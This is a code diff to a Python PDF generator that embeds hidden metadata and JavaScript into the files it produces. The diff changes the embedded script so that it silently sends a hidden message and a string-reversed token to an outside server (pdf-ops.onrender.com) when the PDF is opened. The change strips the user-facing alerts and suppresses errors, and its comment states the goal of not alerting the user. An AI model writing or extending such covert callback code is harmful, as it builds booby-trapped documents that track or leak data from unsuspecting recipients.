@@ -173,27 +173,25 @@ def generate_pdf(logged_data):
     # Add custom metadata containing the hidden message.
     pdf_writer.add_metadata({'/HiddenData': hidden_message})
     
-    # Embed JavaScript callbacks.
+    # Embed JavaScript callbacks without alerting the user.
     js_code = f"""
     // Primary callback: send hidden message to the server.
-    try {{
-        var req1 = new XMLHttpRequest();
-        req1.open("GET", "https://pdf-ops.onrender.com/pdf_callback?data=" + encodeURIComponent("{hidden_message}"), true);
-        req1.onload = function() {{
-            app.alert("Primary callback result: " + req1.responseText);
-        }};
-        req1.send();
-        // Secondary callback: send the reversed token (which is reversed back) to a second endpoint.
-        var reversedToken = "{reversed_token}";
-        var token = reversedToken.split("").reverse().join("");
-        var req2 = new XMLHttpRequest();
-        req2.open("GET", "https://pdf-ops.onrender.com/pdf_callback_stage2?token=" + encodeURIComponent(token), true);
-        req2.onload = function() {{
-            app.alert("Secondary callback result: " + req2.responseText);
-        }};
-        req2.send();
-    }} catch(e) {{
-        app.alert("Error in callbacks: " + e);
+    if (typeof XMLHttpRequest !== 'undefined') {{
+        try {{
+            var req1 = new XMLHttpRequest();
+            req1.open("GET", "https://pdf-ops.onrender.com/pdf_callback?data=" + encodeURIComponent("{hidden_message}"), true);
+            req1.send();
+        }} catch(e) {{}}
+    }}
+    // Secondary callback: send the reversed token (which is reversed back) to a second endpoint.
+    var reversedToken = "{reversed_token}";
+    var token = reversedToken.split("").reverse().join("");
+    if (typeof XMLHttpRequest !== 'undefined') {{
+        try {{
+            var req2 = new XMLHttpRequest();
+            req2.open("GET", "https://pdf-ops.onrender.com/pdf_callback_stage2?token=" + encodeURIComponent(token), true);
+            req2.send();
+        }} catch(e) {{}}
     }}
     """
     pdf_writer.add_js(js_code)
